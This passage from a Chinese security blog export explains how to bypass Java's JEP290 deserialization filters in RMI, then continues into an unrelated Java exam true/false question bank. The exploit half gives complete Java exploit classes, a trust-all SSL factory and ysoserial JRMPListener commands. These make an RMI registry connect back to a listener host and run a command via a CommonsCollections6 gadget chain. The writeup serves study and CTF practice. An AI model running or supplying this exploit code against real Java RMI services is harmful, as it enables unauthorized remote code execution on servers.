<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">return</span> <span class="string">String.class</span> <span class="type">!=</span> <span class="string">var2</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Number.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Remote.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Proxy.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UnicastRef.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIClientSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIServerSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!ActivationID.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UID.class.isAssignableFrom(var2)</span> <span class="string">?</span> <span class="attr">Status.REJECTED :</span> <span class="string">Status.ALLOWED</span></span><br></pre></td></tr></table></figure>

<h3 id="DGC白名单检验"><a href="#DGC白名单检验" class="headerlink" title="DGC白名单检验"></a>DGC白名单检验</h3><p>DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，只有符合如下的类的才能够允许反序列化，否则直接抛出异常</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (clazz == ObjID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == UID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == VMID.<span class="keyword">class</span> ||</span><br><span class="line">                 clazz == Lease.<span class="keyword">class</span>)</span><br><span class="line">                 ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                 : ObjectInputFilter.Status.REJECTED;</span><br></pre></td></tr></table></figure>

<h1 id="JAVA-JEP290的绕过攻击"><a href="#JAVA-JEP290的绕过攻击" class="headerlink" title="JAVA JEP290的绕过攻击"></a>JAVA JEP290的绕过攻击</h1><p>分成两个部分，分别是filterCheck和CheckAccess的绕过</p>
<h2 id="针对CheckAccess绕过攻击-jdk231"><a href="#针对CheckAccess绕过攻击-jdk231" class="headerlink" title="针对CheckAccess绕过攻击 &lt; jdk231"></a>针对CheckAccess绕过攻击 &lt; jdk231</h2><p>其实这个策略只对于攻击注册端的保护，这样子的话我们就无法进行远程绑定对象，也就不能通过客户端去攻击注册端</p>
<p>排除以上的，想绕过的话需要怎么绕过？观察sun.rmi.registry.RegistryImpl_Skel#dispatch，你会发现，其实在RegistryImpl_Skel中的lookup方法还是没有被进行checkAccess的操作的</p>
<p>为什么JEP290没有给lookup本身没有进行checkAccess，原因就是lookup本来功能就是远程接口调用，自然不可能checkAccess，要不然就违背远程调用的意义了</p>
<p><img src="https://baicany.github.io/images/1586953-20221003135842114-1979885251.png" alt="img"></p>
<p>参考ysomap中的实现，可以在ysoserial中自己实现一个lookup方法，使它接受Remote对象作为参数，如下JEP_Naming.java代码所示</p>
<p>这里可能有疑问为什么有原生Naming.java，为什么我们还要自定义写一个呢？这里可以先看下原生Naming.java中的lookup方法实际上是调用sun.rmi.registry.RegistryImpl_Stub#lookup</p>
<p>而该sun.rmi.registry.RegistryImpl_Stub#lookup方法写入的时候只能写入String</p>
<p><img src="https://baicany.github.io/images/1586953-20221003164113202-325007601.png" alt="img"></p>
<p>我们为了触发sun.rmi.registry.RegistryImpl#lookup中var7 &#x3D; (String)var8.readObject();的反序列化readObject操作，就需要将其写入的为我们自定义的Object对象，所以重新写了一个JEP_Naming来写入Object对象</p>
<p><img src="https://baicany.github.io/images/1586953-20221003164205286-1073033733.png" alt="img"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">JEP_Naming</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Disallow anyone from creating one of these</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">JEP_Naming</span>()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span>(<span class="params">Registry registry, Object obj</span>)</span></span><br><span class="line"><span class="function">        throws Exception</span> &#123;</span><br><span class="line">        RemoteRef <span class="keyword">ref</span> = (RemoteRef) Reflections.getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="built_in">long</span> interfaceHash = Long.valueOf(String.valueOf(Reflections.getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) Reflections.getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        java.rmi.server.RemoteCall call = <span class="keyword">ref</span>.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput <span class="keyword">out</span> = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace</span></span><br><span class="line">                Reflections.setFieldValue(<span class="keyword">out</span>, <span class="string">&quot;enableReplace&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">out</span>.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">ref</span>.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="keyword">if</span>(e instanceof RemoteException| e instanceof ClassCastException)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">ref</span>.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JRMPClient_bypass_jep_jdk231.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient_bypass_jep_jdk231</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Remote&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Remote <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient_bypass_jep_jdk231.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient_bypass_jep_jdk231.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIRegistryExploit_bypass_jep_jdk231.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIRegistryExploit_bypass_jep_jdk231</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAllSSL</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> X509Certificate[] ANY_CA = &#123;&#125;;</span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123; <span class="keyword">return</span> ANY_CA; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RMISSLClientSocketFactory</span> <span class="keyword">implements</span> <span class="title class_">RMIClientSocketFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">SSLContext</span> <span class="variable">ctx</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">                ctx.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123;<span class="keyword">new</span> <span class="title class_">TrustAllSSL</span>()&#125;, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ctx.getSocketFactory();</span><br><span class="line">                <span class="keyword">return</span> factory.createSocket(host, port);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1099&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4:2333&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(host, port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.list();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ConnectIOException ex) &#123;</span><br><span class="line">            registry = LocateRegistry.getRegistry(host, port, <span class="keyword">new</span> <span class="title class_">RMISSLClientSocketFactory</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ensure payload doesn&#x27;t detonate during construction or deserialization</span></span><br><span class="line">        exploit(registry, command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,  <span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;Void&gt;()&#123;<span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">JRMPClient_bypass_jep_jdk231</span> <span class="variable">jrmpclient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient_bypass_jep_jdk231</span>();</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> jrmpclient.getObject(command);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                JEP_Naming.lookup(registry,remote);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/1586953-20221003163717886-1731188862.png" alt="img"></p>
<h3 id="针对CheckAccess绕过攻击环境演示"><a href="#针对CheckAccess绕过攻击环境演示" class="headerlink" title="针对CheckAccess绕过攻击环境演示"></a>针对CheckAccess绕过攻击环境演示</h3><p>首先<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections6 calc</code></p>
<p><img src="https://baicany.github.io/images/1586953-20221003164431995-231095052.png" alt="img"></p>
<p>模拟开启一个rmi服务</p>
<p><img src="https://baicany.github.io/images/1586953-20221003164445925-1600303374.png" alt="img"></p>
<p>运行RMIRegistryExploit_bypass_jep_jdk231.java进行攻击</p>
<p><img src="https://baicany.github.io/images/1586953-20221003164517284-2056038898.png" alt="img"></p>
<h2 id="filterCheck绕过攻击UnicastRef类-jdk231"><a href="#filterCheck绕过攻击UnicastRef类-jdk231" class="headerlink" title="filterCheck绕过攻击UnicastRef类 &lt; jdk231"></a>filterCheck绕过攻击UnicastRef类 &lt; jdk231</h2><p>上面讲解了一种绕过RegistryImpl.checkAccess的攻击，所以如果不是本地地址去bind注册端恶意操作的时候，则会触发checkAccess的限制</p>
<p>这里继续讲解filterCheck的绕过，而对于filterCheck的绕过的话，下面的白名单里的类虽然很少，但是还是存在方法可以绕过的</p>
<p>我们客户端去跟注册端或者服务端进行bind或者lookup的操作的时候，实际上都是通过构造unicastRef中LiveRef所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，而恰好unicastRef正好是在filterCheck白名单中，那么如果可以控制unicastRef发起请求的话实际上就能绕过JEP290的限制</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">return</span> <span class="string">String.class</span> <span class="type">!=</span> <span class="string">var2</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Number.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Remote.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Proxy.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UnicastRef.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIClientSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIServerSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!ActivationID.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UID.class.isAssignableFrom(var2)</span> <span class="string">?</span> <span class="attr">Status.REJECTED :</span> <span class="string">Status.ALLOWED</span></span><br></pre></td></tr></table></figure>

<p>上述提及的绕过方法，这其实就是ysoserial中的payloads.JRMPClient的原理，下面大致过一下流程</p>
<p>先观察payloads.JRMPClient利用链如下，可以看到反序列化入口点是UnicastRef的readExternal方法</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">* UnicastRef<span class="selector-class">.newCall</span>(RemoteObject, Operation[], int, long)</span><br><span class="line">* DGCImpl_Stub<span class="selector-class">.dirty</span>(ObjID[], long, Lease)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.makeDirtyCall</span>(Set&lt;RefEntry&gt;, long)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.registerRefs</span>(List&lt;LiveRef&gt;)</span><br><span class="line">* DGCClient<span class="selector-class">.registerRefs</span>(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef<span class="selector-class">.read</span>(ObjectInput, boolean)</span><br><span class="line">* UnicastRef<span class="selector-class">.readExternal</span>(ObjectInput)</span><br><span class="line">*</span><br><span class="line">* Thread<span class="selector-class">.start</span>()</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span>.&lt;init&gt;(Endpoint)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.lookup</span>(Endpoint)</span><br><span class="line">* DGCClient<span class="selector-class">.registerRefs</span>(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef<span class="selector-class">.read</span>(ObjectInput, boolean)</span><br><span class="line">* UnicastRef<span class="selector-class">.readExternal</span>(ObjectInput)</span><br></pre></td></tr></table></figure>

<p>模拟反序列化操作，先开启监听<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections6 calc</code></p>
<p><img src="https://baicany.github.io/images/1586953-20221003144105715-834448889.png" alt="img"></p>
<p>然后反序列化ysoserial.payloads.JRMPClient，这里会在sun.rmi.server.UnicastRef#readExternal停下，如下图所示</p>
<p><img src="https://baicany.github.io/images/1586953-20221003144006745-2011501413.png" alt="img"></p>
<p>获取到的是ObjectInput对象，所以这里的判断分支走的是下面的DGCClient.registerRefs(var2, Arrays.asList(var5));</p>
<p>同时将相关的TCPEndpoint对象读取，其中要请求的地址就是我们的恶意服务端127.0.0.1:2333</p>
<p><img src="https://baicany.github.io/images/1586953-20221003144431826-125293859.png" alt="img"></p>
<p>接着其中的sun.rmi.transport.DGCClient#registerRefs方法继续发起sun.rmi.transport.DGCClient.EndpointEntry#lookup请求，</p>
<p><img src="https://baicany.github.io/images/1586953-20221003144538500-655754011.png" alt="img"></p>
<p>在lookup方法中进行sun.rmi.transport.DGCClient.EndpointEntry实例化，参数为TcpEndPoint对象</p>
<p><img src="https://baicany.github.io/images/1586953-20221003144625226-1005465716.png" alt="img"></p>
<p>实例化EndpointEntry过程中，创建了一个LiveRef对象，接着创建了对应的createProxy中DGC_Stub和DGC_Skel</p>
<p><img src="https://baicany.github.io/images/1586953-20221003145126788-1637188151.png" alt="img"></p>
<p><img src="https://baicany.github.io/images/1586953-20221003145210494-115068629.png" alt="img"></p>
<p>lookup完成了之后得到一个EndpointEntry，又会回到sun.rmi.transport.DGCClient#registerRefs，接着执行EndpointEntry.registerRefs</p>
<p><img src="https://baicany.github.io/images/1586953-20221003145730742-1540672958.png" alt="img"></p>
<p>这里实际上就是通过代理DGCImpl_Stub来发起网络请求，通过sun.rmi.transport.StreamRemoteCall#executeCall请求的目标就是我们的恶意服务端，最终导致反序列化readObject返回的数据，最后命令执行</p>
<p>其中触发sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall -&gt; java.rmi.dgc.DGC#dirty -&gt; java.rmi.server.RemoteRef#invoke(java.rmi.server.RemoteCall) -&gt; sun.rmi.transport.StreamRemoteCall#executeCall</p>
<p><img src="https://baicany.github.io/images/1586953-20221003150527529-112534649.png" alt="img"></p>
<p>过程总结图如下所示</p>
<p><img src="https://baicany.github.io/images/1586953-20221004142114672-1834810197.png" alt="img"></p>
<h3 id="CTF中可能出现的"><a href="#CTF中可能出现的" class="headerlink" title="CTF中可能出现的"></a>CTF中可能出现的</h3><p>1、在ysoserial.payloads.JRMPClient#getObject中什可以看到，构造的对象是通过<code>Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;Registry.class&#125;, obj);</code>，动态代理来实现，实际上这里的动态代理其实都可以不用，直接返回<code>RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</code>这个obj对象同样可以进行触发</p>
<p>2、第二点就是如果RemoteObjectInvocationHandler被过滤的话，其实还可以寻找RemoteObject的其他子类来构造，很多子类都满足要求，比如如下的，只要满足序列化的时候能够将其中的UnicastRef进行保存，最终反序列化的时候触发的还是UnicastRef的操作即可</p>
<p>RemoteObjectInvocationHandler<br>RMIConntionImpl_Stub<br>DGCImpl_Stub<br>RmiServerImpl_Stub<br>ReferenceWrapper_Stub<br>…</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>java复习题</title>
    <url>/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<p>考完试发现都没有考到,老师没有放完所有题库o(╥﹏╥)o，考试还有填空题，还有English.</p>
<h1 id="java判断题"><a href="#java判断题" class="headerlink" title="java判断题"></a>java判断题</h1><p>1.设类B是类C的父类，语句B x1&#x3D;new C( ); 是正确的。T</p>
<p>2.设类B是类C的父类，语句Ｃ x1&#x3D;new Ｂ( ); 是正确的。F</p>
<p>3.Java中的包是专门用来存放类的，通常功能相近的类存放在相同的包中。T</p>
<p>4.Java中的String类型是一种基本数据类型。F</p>
<p>5.在Java中，含有抽象方法的类一定是抽象类。T</p>
<p>6.private修饰的成员变量不能被子类继承，因此在子类中也不为该类型变量分配空间。F</p>
<p>7.String对象和StringBuffer对象都是字符串类型，创建后的对象都可以在原地进行修改。F</p>
<p><strong>8</strong>.在JAVA的集合框架中，Map接口是自Collection接口继承而来。F</p>
<p><strong>9</strong>.在FileInputStream类的对象中,利用read(byte[] bytes)和read(byte[] bytes,int off,int len)方法读取一次数据后，bytes数组中的所有数据都是本次读取的数据。F</p>
<p><strong>10</strong>.多线程是指将CPU资源按时间片分配到多个任务上，看似并行工作，实质上在同一时刻只有一个线程在工作；在一段时间之内，是多个线程在同时工作。T</p>
<p>11.在Java中，输出格式字符串时，也可以利用printf方法进行格式控制。T</p>
<p>12.利于Scanner类的对象进行输入字符串时，使用next()或者nextLine()方法都能取得字符串，二者没有什么差别。F</p>
<p>13.我们编写出程序之后，在必要的时候，可以通过DEBUG模式来调试程序，单步执行程序，观察变量的值的变化，从而尽快发现程序的逻辑错误。T</p>
<p>14.不含公共类的JAVA源文件名称可以随便命名，不受任何限制。T</p>
<p>15.在Windows操作系统和Linux操作系统运行的JAVA虚拟机没有什么差别。（ ）F</p>
<p>16.运行类路径下的HelloWorld.class文件，使用的命令是：java HelloWorld.class 。F</p>
<p>17.使用集成开发工具Eclipse来开发程序，可以省去源程序的编译步骤，直接运行程序。F</p>
<p>18.编译当前路径下的HelloWorld.java文件，使用的命令是：javac HelloWorld.java 。T</p>
<p>19.Java源程序中的字母大小写敏感，而在源文件命名时字母大小写不敏感。F</p>
<p>20.不含公共类的JAVA源文件名称可以随便命名，不受任何限制。T</p>
<p>21.运行类路径下的HelloWorld.class文件，使用的命令是：java HelloWorld.class 。F</p>
<p>22.Java语言和C语言一样，是面向过程的语言。F</p>
<p>23.1991年JDK1.0版本发布。F</p>
<p>24.James Gosling是Java语言的创始人之一。T</p>
<p>25.Java虚拟机可以将类文件（.class）在不同的操作系统上运行，从而实现跨平台特性。T</p>
<p>26.Java源程序中的字母大小写敏感，源文件名字母大小写不敏感。F</p>
<p>27.一个Java源文件的名称可以随便取，不受任何限制。F</p>
<p>28.java.lang包的Character类的isJavaIdentifierStart()方法的功能是用来判断某个字符串是否为合法Java标识符。F</p>
<p>29.java.lang包的Character类的isJavaIdentifierStart()方法的功能是用来判断某个字符是否为合法Java标识符首字符。T</p>
<p>**30.**java.util.Arrays类提供了诸多对数组进行操作的方法。使用其<code>toString()</code>方法可以对一维数组和二维数组展示其元素数值，<code>equals()</code>方法对一维数组和二维数组的两个数组比较其元素内容数值是否对应相等。F</p>
<p>31.两个数组对象利用“&#x3D;&#x3D;”运算符比较若相等，则两数组的各个元素值一定对应相等；反过来说，两个数组的元素值都对应相等，则两个数组一定相等（&#x3D;&#x3D;）。F</p>
<p>32和C语言相似，Java中的局部变量在声明后不赋初值，可以打印其变量的值。.F</p>
<p>33.同一作用域内的局部变量可以重复命名。F</p>
<p>34.Java中，某个四则运算表达式中的数值都是int数据类型，则计算之后的数值一定是int类型。T</p>
<p>35.Java中，某个四则运算表达式中的数值有一个是double类型，则计算之后的数值一定是double类型。T</p>
<p>36.Java基本数据类型都有对应的封装类。封装类能保留其数值，其他方面也没有太大的作用。F</p>
<p>37.在Java中，10&#x2F;3这个表达式计算的结果是3.333333… 。F</p>
<p>38.在Java中，&amp;&amp;、||和 &amp;、|都表示逻辑的与、或运算，二者使用起来没有什么差异。F</p>
<p>39.Java中break语句可用于循环结构或者switch-case结构，作用是终止当前循环或者分支语句。T</p>
<p>40.Java中continue语句的作用是结束本次循环，开始下一次循环。T</p>
<p>41.Java中的switch-case分支结构的特点是等值判断。它能用if分支结构进行改写。T</p>
<p>42.Java中的switch-case分支结构中，一旦控制表达式的计算结果与某个case值匹配成功，就执行完该case对应的语句块，即结束switch-case语句。F</p>
<p>43.Java中的while循环和do-while循环结构的区别是后者至少执行一次循环，而前者可能一次也不执行。T</p>
<p>44.continue; 语句只用于循环语句中，它的作用是跳出循环。F</p>
<p>45.对于基本数据类型和引用型数据类型来说，运算符“&#x3D;&#x3D;”在比较两个变量是否相同时，含义没有什么差别。F</p>
<p>46.数组a的下标取值，取值范围为：从0到a.length。F</p>
<p>47.数组作为一个引用型的数据类型。对于数组a来说，a.length是数组a对象的一个属性。T</p>
<p>48.Java中，比较两个二维数组对象是否相同，就是比较这两个数组的每一个元素是否相同。F</p>
<p>49.Java中二维数组既可以表示m行n列的规则数据，也可以表示多行数据，每一行的列数不相同的不规则数组。T</p>
<p>50.Java中的类是一种数据类型，可以用来声明该类类型的变量。T</p>
<p>51.世界万物皆对象，从具有共同特征的对象中抽取出来静态属性和动态行为的共同特征，用类来进行描述。因此，对象是具体的，类是抽象的。T</p>
<p>52.在方法中使用不定长度参数时，声明的不定长参数必须在参数的最后一个。T</p>
<p>53.在如下代码中，两个变量str和i都是基本数据类型的变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;sdutcs”; </span></span><br><span class="line"><span class="string">int i =100;</span></span><br></pre></td></tr></table></figure>

<p>F</p>
<p>54.局部变量可以与成员变量重名。T</p>
<p>55.类变量属于类和所有的对象所共享。利用类来引用类变量，对类变量的值做了改变，再利用对象来引用类变量，它们的值是相等的。T</p>
<p>56.实例变量是属于对象的。一个类的多个对象对实例变量可以设置不同的值。T</p>
<p>57.Java中的每个类都至少有一个构造方法，一个类如果没有显式地定义构造方法，系统会自动为这个类创建一个默认的无参的构造方法。T</p>
<p>58.有如下类的定义：</p>
